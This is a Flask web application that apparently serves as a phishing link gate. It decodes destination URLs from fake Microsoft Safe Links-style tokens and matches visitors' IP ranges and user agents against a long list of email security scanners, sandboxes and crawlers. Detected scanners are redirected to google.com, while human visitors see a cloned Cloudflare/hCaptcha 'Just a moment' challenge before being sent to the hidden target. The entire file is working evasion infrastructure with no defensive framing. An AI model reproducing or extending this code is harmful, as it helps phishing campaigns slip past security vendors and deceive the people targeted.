import os
import time
import json
import secrets
import base64
import logging
from ipaddress import ip_address, ip_network
from urllib.parse import urlsplit, urlunsplit, urlencode, parse_qsl, quote

from flask import (
    Flask, request, redirect, render_template_string,
    abort, make_response, jsonify,
)
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------
SK = os.environ.get("SECRET_KEY", "7b311b50f8306ae1fbe13f4db9b030267f77f3cc0020889b8cb583895afb443e")
if len(SK) < 32:
    raise RuntimeError("SECRET_KEY must be >= 32 chars")

GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.google.com")

app = Flask(__name__)
app.secret_key = SK.encode()
cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("link-gate")

# ---------------------------------------------------------------------------
# scanner networks & UAs
# ---------------------------------------------------------------------------
EOP = [
    ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
    ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"),
    ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
    ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
]
PROOFPOINT = [
    ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20"),
    ip_network("185.132.40.0/22"), ip_network("185.132.44.0/22"),
    ip_network("194.154.77.0/24"), ip_network("195.245.230.0/23"),
    ip_network("62.128.218.0/23"),
    ip_network("217.146.94.0/23"), ip_network("217.146.96.0/20"),
]
MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]

SCANNER_NETS = {
    "microsoft_eop": EOP,
    "proofpoint": PROOFPOINT,
    "mimecast": MIMECAST,
    "barracuda": BARRACUDA,
    "cisco_talos": TALOS,
    "google_safebrowsing": GOOGLE_SAFEBROWSING,
    "abnormal": [ip_network("199.255.200.0/22"), ip_network("192.30.44.0/22")],
    "avanan": [ip_network("52.5.0.0/16"), ip_network("52.20.0.0/14"), ip_network("34.192.0.0/12")],
    "ironscales": [ip_network("104.196.0.0/14"), ip_network("35.184.0.0/13")],
    "cloudflare_email": [ip_network("104.30.0.0/18")],
    "zscaler": [ip_network("104.129.192.0/20"), ip_network("165.225.0.0/17")],
    "forcepoint": [ip_network("157.238.0.0/16"), ip_network("209.104.0.0/20")],
}

SCANNER_UA_TOKENS = (
    "microsoft office", "safelinks", "microsoft preview", "proofpoint",
    "pp-url", "mimecast", "barracuda", "talos", "ironport",
    "forcepoint", "symantec", "messagelabs", "trendmicro", "trend micro",
    "kaspersky", "sophos", "fireeye", "mandiant", "abnormal security",
    "avanan", "ironscales", "cloudmark", "agari", "valimail",
    "hornetsecurity", "spamhaus", "zerospam", "retarus", "vade",
    "urlscan", "urlscan.io", "virustotal", "any.run", "hybrid-analysis",
    "joesandbox", "joe sandbox", "cuckoo", "triage", "hatching",
    "intezer", "cape sandbox", "reverse.it", "filescan.io",
    "googlebot", "google-safety", "bingpreview", "bingbot", "duckduckbot",
    "yandexbot", "baiduspider", "slackbot", "twitterbot", "facebookexternalhit",
    "linkedinbot", "discordbot", "telegrambot", "whatsapp", "skypeuripreview",
    "applebot", "pinterestbot", "embedly", "quora link preview", "outbrain",
    "nuzzel", "vk share", "w3c_validator",
    "curl/", "wget/", "python-requests", "python-urllib", "go-http-client",
    "java/", "okhttp", "axios/", "node-fetch", "undici", "libwww-perl",
    "masscan", "nmap", "zgrab", "nuclei", "nikto", "sqlmap",
    "headlesschrome", "phantomjs", "puppeteer", "playwright",
    "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot",
    "statuscake", "site24x7", "newrelic", "datadog synthetics",
)

ALLOWLIST_IPS = []
ALLOWLIST_UA = ()

def client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or ""

def classify(ip: str, ua: str) -> dict:
    out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
    low = ua.lower()
    if any(tok in low for tok in ALLOWLIST_UA):
        out["source"] = "allowlist_ua"
        return out
    try:
        a = ip_address(ip)
    except ValueError:
        a = None
    if a is not None:
        if any(a in n for n in ALLOWLIST_IPS):
            out["source"] = "allowlist_ip"
            return out
        for name, nets in SCANNER_NETS.items():
            if any(a in n for n in nets):
                out["scanner"] = True
                out["source"] = name
                out["method"] = "ip"
                break
    if not out["scanner"]:
        for tok in SCANNER_UA_TOKENS:
            if tok in low:
                out["scanner"] = True
                out["source"] = tok
                out["method"] = "ua"
                break
    return out

def parse_payload_from_eop(eop_string):
    if not eop_string.startswith("u001."):
        return None
    try:
        clean = eop_string[5:].replace("-3D-3D", "").replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
        parts = clean.split("-")
        if len(parts) < 2:
            return None
        b64_payload = parts[-1]
        padding = '=' * (-len(b64_payload) % 4)
        decoded = base64.urlsafe_b64decode(b64_payload + padding).decode('utf-8')
        return json.loads(decoded)
    except Exception as e:
        log.error(f"Failed to parse payload: {e}")
        return None

def _apply_unified_headers(resp):
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["Expires"] = "0"
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "no-referrer"
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "img-src 'self' data: https:; "
        "style-src 'self' 'unsafe-inline' https:; "
        "font-src 'self' data: https:; "
        "script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com https://js.hcaptcha.com; "
        "connect-src 'self' https://challenges.cloudflare.com https://js.hcaptcha.com; "
        "form-action *; "
        "base-uri 'none'; "
        "frame-ancestors 'none'"
    )

def _static_page(title: str, text: str, status_code: int):
    html = f"""<!doctype html><html><head><meta charset="utf-8"><title>{title}</title>
    <style>body{{font-family:system-ui,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9}}
    .c{{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.05);text-align:center;max-width:400px}}</style>
    </head><body><div class="c"><h1>{title}</h1><p>{text}</p></div></body></html>"""
    resp = make_response(html, status_code)
    _apply_unified_headers(resp)
    return resp

# --- THE CLOUDFLARE/HCAPTCHA CLONE ---
LANDING = """<!DOCTYPE html>
<html lang="en-US">
    <head>
        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" async defer></script>
        <script src="https://js.hcaptcha.com/1/api.js" async defer></script>

        <title>Just a moment...</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
        <meta name="robots" content="noindex,nofollow" />
        <meta name="viewport" content="width=device-width,initial-scale=1" />
        <script>
            var verifyCallback_CF = function (response) {
                let cfForm = document.querySelector("#cfForm")
                if (validateElement(cfForm) && response.length > 10) {
                    cfForm.remove()
                    document.getElementById("submit-form").submit()
                    return
                }
                return switchToSecondCaptcha()
            }
            var verifyCallback_hCaptcha = function (response) {
                let gForm = document.querySelector("#gForm")
                if (gForm == undefined) { return }
                if (gForm.style != undefined && gForm.style.visibility != undefined) {
                    gForm = document.querySelector("#gForm").style.visibility = "hidden"
                }
                document.getElementById("submit-form").submit()
            }
            function validateElement(element) {
                return element != undefined && element.style != undefined && element.style.visibility != undefined
            }
            window.switchToSecondCaptcha = function () {
                let gForm = document.querySelector("#gForm")
                if (validateElement(gForm) || gForm.style == "visible") { return }
                setTimeout(function () {
                    const cfForm = document.querySelector("#cfForm")
                    if (validateElement(cfForm) && cfForm.style.visibility != "hidden") {
                        cfForm.remove()
                    }
                    setTimeout(function () {
                        gForm.style.visibility = "visible"
                    }, 200)
                }, 200)
            }
            var refreshCallBack = function (response) {
                setTimeout(function () { window.location.reload() }, 1000)
            }
        </script>
        <script>
            window.onloadTurnstileCallback = function () {
                turnstile.render("#turnstileCaptcha", {
                    sitekey: "0x4AAAAAAADnPIDOXQ8p7gPv",
                    callback: verifyCallback_CF,
                    "expired-callback": refreshCallBack,
                })
            }
        </script>
        <script>
            var incrementLoader = function () {
                const waitp = document.querySelector("#cf-spinner-please-wait")
                const gForm = document.querySelector("#gForm")
                if (validateElement(gForm) && gForm.style.visibility == "hidden") {
                    waitp.textContent += "."
                }
            }
            setTimeout(() => {
                let i = 0
                ticker = setInterval(function () {
                    i += 1
                    incrementLoader()
                    if (i > 3) { clearInterval(ticker); return }
                }, 1000)
            }, 500)

            setTimeout(function () {
                const cfForm = document.querySelector("#cfForm")
                if (!validateElement(cfForm)) { switchToSecondCaptcha(); return }
                const gForm = document.querySelector("#gForm")
                if (!validateElement(gForm)) { return }
                 if (cfForm.style.visibility == "visible" || gForm.style.visibility != "visible") {
                    switchToSecondCaptcha()
                }
            }, 7000)
        </script>
    </head>
    <body class="no-js">
        <div class="main-wrapper" role="main">
            <div class="main-content">
                <h1 class="zone-name-title h1">
                    <div>
                        <img class="" src="" style="margin-bottom: -17px" style="visibility: hidden" onerror="this.onerror=null;this.parentNode.removeChild(this)" />
                        <div id="site-name"></div>
                    </div>
                </h1>
                <span id="challenge-error-text"></span>
                <noscript>
                    <div id="challenge-error-title">
                        <div class="h2">
                            <div class="icon-wrapper">
                                <div class="heading-icon warning-icon"></div>
                            </div>
                            <span class="icon-wrapper">
                                <div class="heading-icon warning-icon"></div>
                            </span>
                            <span id="challenge-error-text"> Enable JavaScript and cookies to continue </span>
                        </div>
                    </div>
                </noscript>
                <p data-translate="please_wait" id="cf-spinner-please-wait">Please stand by, while we are checking if the site connection is secure</p>
                <form action="?" method="POST" id="gForm" style="visibility: hidden">
                    <div class="h-captcha" data-sitekey="234adb2f-52ba-4697-82fa-abecbb14b173" data-callback="verifyCallback_hCaptcha"></div>
                    <br>
                </form>
                <form action="?" method="POST" id="cfForm" style="visibility: visible" data-callback="verifyCallback_CF">
                    <div id="turnstileCaptcha"></div>
                    <br>
                </form>
                <form id="submit-form" method="POST" action="{{ action }}">
                    <input type="hidden" name="n" value="{{ nonce }}">
                    <input type="hidden" name="t" value="{{ token }}">
                </form>
                <div id="challenge-body-text" class="core-msg spacer">
                    <div id="site-name" style="float: left; margin-left: 10px; margin-right: 10px"></div>
                    <div style="margin: 10px"></div>
                </div>
            </div>
        </div>
        <div class="footer" role="contentinfo">
            <div class="footer-inner">
                <div class="text-center">
                    <a rel="noopener noreferrer" href="https://www.microsoft.com?utm_source=challenge&utm_campaign=m" target="_blank"></a>
                </div>
            </div>
        </div>
    </body>
</html>"""

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": int(time.time())})

@app.route("/", methods=["GET"])
def root():
    return _static_page("Not found", "Nothing here.", 404)

@app.route("/ls/<path:token>", methods=["GET"])
def landing(token: str):
    if not token.startswith("click_upn="):
        return _static_page("Invalid link", "This link is not valid.", 404)
        
    eop_token = token.replace("click_upn=", "")
    data = parse_payload_from_eop(eop_token)
    
    if not data or "target" not in data:
        return _static_page("Invalid link", "Could not parse target.", 404)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    log.info(json.dumps({"event": "landing_get", **tag}))

    if tag["scanner"]:
        unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)
        return redirect(unwanted, code=302)

    nonce_payload = {"t": eop_token, "ts": time.time()}
    nonce_blob = cookie_serializer.dumps(nonce_payload)

    html = render_template_string(
        LANDING,
        action=f"/submit/{quote(eop_token)}",
        token=eop_token,
        nonce=nonce_blob
    )

    resp = make_response(html)
    is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
    resp.set_cookie("gate_session", nonce_blob, max_age=GATE_TTL, httponly=True, secure=is_https, samesite="None", path="/")
    _apply_unified_headers(resp)
    return resp

@app.route("/submit/<path:token>", methods=["POST"])
def execute(token: str):
    tag = classify(client_ip(), request.headers.get("User-Agent", ""))

    if tag["scanner"]:
        return redirect(UNWANTED_REDIRECT_URL, code=302)

    submitted_blob = request.form.get("n", "")
    if not submitted_blob:
        return _static_page("Missing Context", "Verification payload missing.", 400)

    try:
        nonce_data = cookie_serializer.loads(submitted_blob, max_age=GATE_TTL)
    except (SignatureExpired, BadSignature):
        return _static_page("Session Expired", "Verification context expired.", 400)

    if not secrets.compare_digest(nonce_data.get("t", ""), token):
        return _static_page("Verification Failed", "Verification payload mismatched.", 400)

    data = parse_payload_from_eop(token)
    if not data or "target" not in data:
         return _static_page("Invalid link", "Could not parse target.", 404)

    target = data["target"]
    
    resp = make_response(redirect(target, code=303))
    resp.delete_cookie("gate_session", path="/")
    _apply_unified_headers(resp)
    return resp

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
